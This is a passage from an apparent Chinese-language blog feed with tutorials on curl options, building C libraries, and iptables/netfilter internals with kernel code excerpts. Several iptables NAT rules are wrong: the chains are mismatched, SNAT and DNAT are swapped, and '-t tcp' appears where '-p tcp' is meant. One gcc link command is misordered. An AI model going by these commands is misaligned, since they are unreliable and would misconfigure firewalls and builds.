class="hljs-keyword">in</span> server.csr -signkey server.key -out server.crt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>curl基本使用</title>
    <link href="/2022/05/26/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/05/26/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="curl基本使用"><a href="#curl基本使用" class="headerlink" title="curl基本使用"></a>curl基本使用</h1><h3 id="1-什么是curl"><a href="#1-什么是curl" class="headerlink" title="1.什么是curl?"></a>1.什么是curl?</h3><p>curl是一个命令行工具,用于向指定的url发送请求,支持http,mqtt,ftp,rtmp,pop2,scp等各种协议</p><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --verbose www.baidu.com<br><span class="hljs-comment">#verbose 用于打开verbose,使用这个模式可以查看到发送的数据包信息</span><br>curl -A <span class="hljs-string">&quot;curl&quot;</span> www.baidu.com<br><span class="hljs-comment">#-A参数指定特定的User-Agent</span><br>curl -A <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0&quot;</span> https://www.baidu.com/index.html<br><span class="hljs-comment">#-b参数用于向服务器传输cookie,也可以指定cookie文件</span><br>curl -b <span class="hljs-string">&quot;x_key=asjdflkdjaslfdjklasjlkf&quot;</span> http://www.google.com/index.html<br><span class="hljs-comment">#-c参数用于将服务器设置的cookie写入一个文件</span><br>curl -c coookie.txt -v http://www.baidu.com/index.html<br><span class="hljs-comment">#-d,--data-urlencode参数用于发送post请求的数据</span><br>curl -d <span class="hljs-string">&quot;name=admin&amp;password=password&quot;</span> -X POST https://www.baidu.com/index.html<br><span class="hljs-comment">#-X参数用与指定发送的请求方式如Get Post</span><br><span class="hljs-comment">#-e参数用于指定refer头</span><br>curl -e <span class="hljs-string">&quot;http://www.baidu.com/index.html&quot;</span> https://www.google.com<br><span class="hljs-comment">#-F参数用于上传二进制文件</span><br>curl -F <span class="hljs-string">&#x27;file=@photo.png&#x27;</span> https://baidu.com/profile<br><span class="hljs-comment">#-F参数可以指定上传的文件的MIME类型</span><br>curl -F <span class="hljs-string">&quot;file=@photo.png;image/png&quot;</span> -X POST https://www.baidu.com/profile<br>curl -F <span class="hljs-string">&quot;file=@photo.png;filename=me.png&quot;</span> -X POST https://www.baidu.com/profile<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件基本使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c语言库的制作</title>
    <link href="/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/"/>
    <url>/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="c语言库的制作"><a href="#c语言库的制作" class="headerlink" title="c语言库的制作"></a>c语言库的制作</h1><h3 id="1-静态库和动态库的制作"><a href="#1-静态库和动态库的制作" class="headerlink" title="1.静态库和动态库的制作"></a>1.静态库和动态库的制作</h3><h5 id="1-准备头文件和对应的api实现源码"><a href="#1-准备头文件和对应的api实现源码" class="headerlink" title="1.准备头文件和对应的api实现源码"></a>1.准备头文件和对应的api实现源码</h5><p>1.mylib.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">interface</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p>1.mylib.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mylib.h&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">interface</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is my first interface &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="制作静态库"><a href="#制作静态库" class="headerlink" title="制作静态库"></a>制作静态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译目标文件</span><br>gcc -c mylib.c -o mylib.o<br><span class="hljs-comment">#制作静态库文件</span><br>ar crs libmylib.a mylib.o<br></code></pre></td></tr></table></figure><h6 id="制作动态库"><a href="#制作动态库" class="headerlink" title="制作动态库"></a>制作动态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译目标文件</span><br>gcc -c mylib.c -o mylib.o<br><span class="hljs-comment">#制作动态链接库、</span><br>gcc -shared -o libmylib.so mylib.o<br></code></pre></td></tr></table></figure><h3 id="2-自定义库的使用"><a href="#2-自定义库的使用" class="headerlink" title="2.自定义库的使用"></a>2.自定义库的使用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*main.c*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mylib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    interface();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="静态库的使用"><a href="#静态库的使用" class="headerlink" title="静态库的使用"></a>静态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译</span><br>gcc -L. -lmylib main.c -o main<br><span class="hljs-comment">#运行</span><br>./main<br></code></pre></td></tr></table></figure><h6 id="动态库的使用"><a href="#动态库的使用" class="headerlink" title="动态库的使用"></a>动态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">编译目标文件<br>gcc -L. -lmylib main.c -o main<br><span class="hljs-comment">#运行</span><br><span class="hljs-comment">#是指动态链接库的路径,(可以设置LD_LIBRARY_PATH的值或者是将编译好的动态链接库拷贝至/usr/lib路径下)</span><br><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=.<br>./main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>嵌入式开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iptables的基本原理以及使用</title>
    <link href="/2022/04/30/iptables/"/>
    <url>/2022/04/30/iptables/</url>
    
    <content type="html"><![CDATA[<h1 id="netfilter-x2F-iptables使用"><a href="#netfilter-x2F-iptables使用" class="headerlink" title="netfilter&#x2F;iptables使用"></a>netfilter&#x2F;iptables使用</h1><h3 id="1-什么是iptables？"><a href="#1-什么是iptables？" class="headerlink" title="1.什么是iptables？"></a>1.什么是iptables？</h3><p>netfliter&#x2F;iptables是linux一个用来过滤流量以及数据包转发的内核模块</p><p>是linux内核的一部分,iptables是linux中的一个工具,运行在用户空间,可以控制netfliter中增加修改删除数据包的处理规则,netfliter位于网卡和内核之间,可以控制计算机的进出流量</p><h3 id="2-内核源码分析"><a href="#2-内核源码分析" class="headerlink" title="2.内核源码分析"></a>2.内核源码分析</h3><h5 id="2-1-hooks函数"><a href="#2-1-hooks函数" class="headerlink" title="2.1.hooks函数"></a>2.1.hooks函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_inet_hooks</span> &#123;</span><br>NF_INET_PRE_ROUTING,<br>NF_INET_LOCAL_IN,<br>NF_INET_FORWARD,<br>NF_INET_LOCAL_OUT,<br>NF_INET_POST_ROUTING,<br>NF_INET_NUMHOOKS,<br>NF_INET_INGRESS = NF       <br><span class="hljs-comment">//hooks函数定义</span><br></code></pre></td></tr></table></figure><h5 id="2-2-第一个挂接点-NF-INET-PRE-ROUTING"><a href="#2-2-第一个挂接点-NF-INET-PRE-ROUTING" class="headerlink" title="2.2.第一个挂接点(NF_INET_PRE_ROUTING)"></a>2.2.第一个挂接点(NF_INET_PRE_ROUTING)</h5><p>这个挂接点是网卡接受数据之后第一个执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//网卡接受数据后调用的第一个函数就是ip_rcv函数,ipv6为ip6_rcv</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_rcv</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> net_device *dev, <span class="hljs-keyword">struct</span> packet_type *pt,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> net_device *orig_dev)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(dev);<br><br>skb = ip_rcv_core(skb, net);<br><span class="hljs-keyword">if</span> (skb == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> NET_RX_DROP;<br><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,<br>       net, <span class="hljs-literal">NULL</span>, skb, dev, <span class="hljs-literal">NULL</span>,<br>       ip_rcv_finish);<span class="hljs-comment">//下一个挂接点NF_INET_PRE_ROUTING</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-3-第二个挂接点（NF-INET-LOCAL-IN"><a href="#2-3-第二个挂接点（NF-INET-LOCAL-IN" class="headerlink" title="2.3.第二个挂接点（NF_INET_LOCAL_IN)"></a>2.3.第二个挂接点（NF_INET_LOCAL_IN)</h5><p>这个挂接点在数据包进行路由之后,数据包目标ip是本机的时候执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_local_deliver</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Reassemble IP fragments.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(skb-&gt;dev);<br><br><span class="hljs-keyword">if</span> (ip_is_fragment(ip_hdr(skb))) &#123;<br><span class="hljs-keyword">if</span> (ip_defrag(net, skb, IP_DEFRAG_LOCAL_DELIVER))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_LOCAL_IN,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, <span class="hljs-literal">NULL</span>,<br>       ip_local_deliver_finish);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-3-第三个挂接点-NF-INET-FORWARD"><a href="#2-3-第三个挂接点-NF-INET-FORWARD" class="headerlink" title="2.3.第三个挂接点(NF_INET_FORWARD)"></a>2.3.第三个挂接点(NF_INET_FORWARD)</h5><p>数据包进入网络层进行路由时,数据包路由选择后目标ip不是本机时执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_forward</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>u32 mtu;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span><span class="hljs-comment">/* Our header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rtable</span> *<span class="hljs-title">rt</span>;</span><span class="hljs-comment">/* Route we use */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_options</span> *<span class="hljs-title">opt</span>=</span> &amp;(IPCB(skb)-&gt;opt);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span>;</span><br><br><span class="hljs-comment">/* that should never happen */</span><br><span class="hljs-keyword">if</span> (skb-&gt;pkt_type != PACKET_HOST)<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (unlikely(skb-&gt;sk))<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (skb_warn_if_lro(skb))<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (!xfrm4_policy_check(<span class="hljs-literal">NULL</span>, XFRM_POLICY_FWD, skb))<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (IPCB(skb)-&gt;opt.router_alert &amp;&amp; ip_call_ra_chain(skb))<br><span class="hljs-keyword">return</span> NET_RX_SUCCESS;<br><br>skb_forward_csum(skb);<br>net = dev_net(skb-&gt;dev);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *According to the RFC, we must first decrease the TTL field. If</span><br><span class="hljs-comment"> *that reaches zero, we must reply an ICMP control message telling</span><br><span class="hljs-comment"> *that the packet&#x27;s lifetime expired.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ip_hdr(skb)-&gt;ttl &lt;= <span class="hljs-number">1</span>)<br><span class="hljs-keyword">goto</span> too_many_hops;<br><br><span class="hljs-keyword">if</span> (!xfrm4_route_forward(skb))<br><span class="hljs-keyword">goto</span> drop;<br><br>rt = skb_rtable(skb);<br><br><span class="hljs-keyword">if</span> (opt-&gt;is_strictroute &amp;&amp; rt-&gt;rt_uses_gateway)<br><span class="hljs-keyword">goto</span> sr_failed;<br><br>IPCB(skb)-&gt;flags |= IPSKB_FORWARDED;<br>mtu = ip_dst_mtu_maybe_forward(&amp;rt-&gt;dst, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">if</span> (ip_exceeds_mtu(skb, mtu)) &#123;<br>IP_INC_STATS(net, IPSTATS_MIB_FRAGFAILS);<br>icmp_send(skb, ICMP_DEST_UNREACH, ICMP_FRAG_NEEDED,<br>  htonl(mtu));<br><span class="hljs-keyword">goto</span> drop;<br>&#125;<br><br><span class="hljs-comment">/* We are about to mangle packet. Copy it! */</span><br><span class="hljs-keyword">if</span> (skb_cow(skb, LL_RESERVED_SPACE(rt-&gt;dst.dev)+rt-&gt;dst.header_len))<br><span class="hljs-keyword">goto</span> drop;<br>iph = ip_hdr(skb);<br><br><span class="hljs-comment">/* Decrease ttl after skb cow done */</span><br>ip_decrease_ttl(iph);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *We now generate an ICMP HOST REDIRECT giving the route</span><br><span class="hljs-comment"> *we calculated.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IPCB(skb)-&gt;flags &amp; IPSKB_DOREDIRECT &amp;&amp; !opt-&gt;srr &amp;&amp;<br>    !skb_sec_path(skb))<br>ip_rt_send_redirect(skb);<br><br><span class="hljs-keyword">if</span> (net-&gt;ipv4.sysctl_ip_fwd_update_priority)<br>skb-&gt;priority = rt_tos2priority(iph-&gt;tos);<br><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_FORWARD,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, rt-&gt;dst.dev,<br>       ip_forward_finish);<br><br>sr_failed:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Strict routing permits no gatewaying</span><br><span class="hljs-comment"> */</span><br> icmp_send(skb, ICMP_DEST_UNREACH, ICMP_SR_FAILED, <span class="hljs-number">0</span>);<br> <span class="hljs-keyword">goto</span> drop;<br><br>too_many_hops:<br><span class="hljs-comment">/* Tell the sender its packet died... */</span><br>__IP_INC_STATS(net, IPSTATS_MIB_INHDRERRORS);<br>icmp_send(skb, ICMP_TIME_EXCEEDED, ICMP_EXC_TTL, <span class="hljs-number">0</span>);<br>drop:<br>kfree_skb(skb);<br><span class="hljs-keyword">return</span> NET_RX_DROP;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-4-第四个挂接点（NF-INET-LOCAL-OUT"><a href="#2-4-第四个挂接点（NF-INET-LOCAL-OUT" class="headerlink" title="2.4.第四个挂接点（NF_INET_LOCAL_OUT)"></a>2.4.第四个挂接点（NF_INET_LOCAL_OUT)</h5><p>本机数据向外发送数据时刚从传输层出来第一个执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __ip_local_out(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span> =</span> ip_hdr(skb);<br><br>iph-&gt;tot_len = htons(skb-&gt;len);<br>ip_send_check(iph);<br><br><span class="hljs-comment">/* if egress device is enslaved to an L3 master device pass the</span><br><span class="hljs-comment"> * skb to its handler for processing</span><br><span class="hljs-comment"> */</span><br>skb = l3mdev_ip_out(sk, skb);<br><span class="hljs-keyword">if</span> (unlikely(!skb))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>skb-&gt;protocol = htons(ETH_P_IP);<br><br><span class="hljs-keyword">return</span> nf_hook(NFPROTO_IPV4, NF_INET_LOCAL_OUT,<br>       net, sk, skb, <span class="hljs-literal">NULL</span>, skb_dst(skb)-&gt;dev,<br>       dst_output);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-5-第五个挂接点-NF-INET-POST-ROUTING"><a href="#2-5-第五个挂接点-NF-INET-POST-ROUTING" class="headerlink" title="2.5.第五个挂接点(NF_INET_POST_ROUTING)"></a>2.5.第五个挂接点(NF_INET_POST_ROUTING)</h5><p>数据在执行路由选择之后即将进入链路层的时候执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_output</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">dev</span> =</span> skb_dst(skb)-&gt;dev, *indev = skb-&gt;dev;<br><br>IP_UPD_PO_STATS(net, IPSTATS_MIB_OUT, skb-&gt;len);<br><br>skb-&gt;dev = dev;<br>skb-&gt;protocol = htons(ETH_P_IP);<br><br><span class="hljs-keyword">return</span> NF_HOOK_COND(NFPROTO_IPV4, NF_INET_POST_ROUTING,<br>    net, sk, skb, indev, dev,<br>    ip_finish_output,<br>    !(IPCB(skb)-&gt;flags &amp; IPSKB_REROUTED));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-流量在netfilter中的走向"><a href="#2-流量在netfilter中的走向" class="headerlink" title="2.流量在netfilter中的走向"></a>2.流量在netfilter中的走向</h3><p><img src="/images/iptables.png" alt="iptables"></p><h3 id="3-iptables的结构"><a href="#3-iptables的结构" class="headerlink" title="3.iptables的结构"></a>3.iptables的结构</h3><h4 id="4张表"><a href="#4张表" class="headerlink" title="4张表"></a>4张表</h4><ul><li><p>raw</p><p>用于赶上连接之前处理数据包,比如在数据流量大的时候,可以定义某条规则不进入跟踪链,提高iptables效率</p></li><li><p>mangle</p><p>用于修改数据包,如TOS,QOS</p></li><li><p>nat</p><p>用于数据包的网络地址转换</p></li><li><p>filter</p><p>用于数据包的过滤</p></li></ul><h4 id="五条链"><a href="#五条链" class="headerlink" title="五条链"></a>五条链</h4><ul><li><p>PREROUTING</p><p>用于路由器前转换(如源地址转换(SNAT))</p></li><li><p>INPUT</p><p>用于入站流量处理</p></li><li><p>FORWARD</p><p>用于转发流量处理</p></li><li><p>OUTPUT</p><p>用于出战流量处理</p></li><li><p>POSTROUTING</p><p>用于路由后转换(如目标地址转换(DNAT))</p></li></ul><h3 id="4-基本用法"><a href="#4-基本用法" class="headerlink" title="4.基本用法"></a>4.基本用法</h3><p>命令格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t [table] COMMAND(chains) -p [protocol] -s [<span class="hljs-built_in">source</span> ip address] -d [destination ip address] ..... -j ACTION<br>-R/I/A(修改/插入/追加)<br>-t 指定表<br>-p 指定协议（tcp/udp/icmp)<br>-s 指定源ip地址(ip/mask)<br>-d 指定目标ip地址<br>--dport 指定目标端口<br>--sport 指定源端口<br>-j 指定处理类型(DROP/REJECT/ACCEPT/REDIRECT/MASQUERADE)(丢弃,丢弃并回应,允许,重定向,伪装源ip地址)<br>-m 指定扩展类型(multiport/state)<br>--state 指定连接状态(NEW,ESTABLISHED)<br>--tcp-flags(SYN,ACK,PSH,FIN,)<br>--icmp-type(指定icmp的标志位,echo-request,echo-reply)<br>-i 指定入站网卡<br>-o 指定出战网卡<br></code></pre></td></tr></table></figure><h5 id="配置链的默认策略"><a href="#配置链的默认策略" class="headerlink" title="配置链的默认策略"></a>配置链的默认策略</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t filter -P INPUT DROP/ACCEPT<br></code></pre></td></tr></table></figure><h5 id="配置数据包过滤"><a href="#配置数据包过滤" class="headerlink" title="配置数据包过滤"></a>配置数据包过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置</span><br>iptables -t filter -I INPUT -t tcp -s 0.0.0.0/0 -d 0.0.0.0/0 --dport 80 -j DROP<br></code></pre></td></tr></table></figure><h5 id="配置nat"><a href="#配置nat" class="headerlink" title="配置nat"></a>配置nat</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置源地址转换</span><br>iptables -t nat -I PREROUTING -s 0.0.0.0/0 -d 0.0.0.0 -j MASQUERADE<br><span class="hljs-comment">#配置目标地址转换</span><br>iptables -t nat -I POSTROUTING -s 0.0.0.0/0 -d 0.0.0.0/0 -j DNAT --to-destination 192.168.50.1/24<br></code></pre></td></tr></table></figure><h5 id="配置保存iptables规则"><a href="#配置保存iptables规则" class="headerlink" title="配置保存iptables规则"></a>配置保存iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-save &gt; ./iptables.txt<br></code></pre></td></tr></table></figure><h5 id="配置导入iptables规则"><a href="#配置导入iptables规则" class="headerlink" title="配置导入iptables规则"></a>配置导入iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-restore &lt; ./iptables.txt<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>iptable是linux中控制流量进出的非常有效的工具,在了解iptables的同时可以非常深刻的了解linux中接收流量后流量的走向。</p><p>参考:<a href="https://zhuanlan.zhihu.com/p/507786224">https://zhuanlan.zhihu.com/p/507786224</a></p>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPSEC VPN</title>
    <link href="/2022/04/27/IPSecVPN/"/>
    <url>/2022/04/27/IPSecVPN/</url>
    
